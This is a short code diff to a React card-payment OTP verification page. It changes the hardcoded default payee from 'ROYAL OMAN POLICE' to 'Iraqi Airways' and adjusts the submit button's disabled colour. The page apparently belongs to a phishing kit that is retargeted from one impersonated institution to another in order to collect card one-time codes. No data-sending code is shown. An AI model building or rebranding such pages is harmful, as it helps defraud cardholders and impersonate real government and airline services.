@@ -276,7 +276,7 @@ export default function OTPVerification() {
               {t.cardEndingIn} <span className="font-semibold text-gray-900">{cardLast4}</span>. {t.enterCode}
             </p>
             <p className="mt-2">
-              {t.youArePaying} <span className="font-semibold text-gray-900">{serviceName || "ROYAL OMAN POLICE"}</span> {t.anAmountOf} <span className="font-semibold text-black">{totalAmount}</span> {t.on} {formatDate(currentTime)} {t.at} {formatTime(currentTime)}
+              {t.youArePaying} <span className="font-semibold text-gray-900">{serviceName || "Iraqi Airways"}</span> {t.anAmountOf} <span className="font-semibold text-black">{totalAmount}</span> {t.on} {formatDate(currentTime)} {t.at} {formatTime(currentTime)}
             </p>
           </div>
 
@@ -317,7 +317,7 @@ export default function OTPVerification() {
             {/* Submit Button */}
             <button 
               type="submit" 
-              className="w-full py-3 text-white text-sm font-medium uppercase tracking-wider rounded-md transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed" style={{backgroundColor: '#1B5E20'}}
+              className="w-full py-3 text-white text-sm font-medium uppercase tracking-wider rounded-md transition-colors disabled:cursor-not-allowed" style={{backgroundColor: (isWaiting || (otp.length !== 4 && otp.length !== 6)) ? '#ccc' : '#1B5E20'}}
               disabled={isWaiting || (otp.length !== 4 && otp.length !== 6)}
             >
               {isWaiting ? (
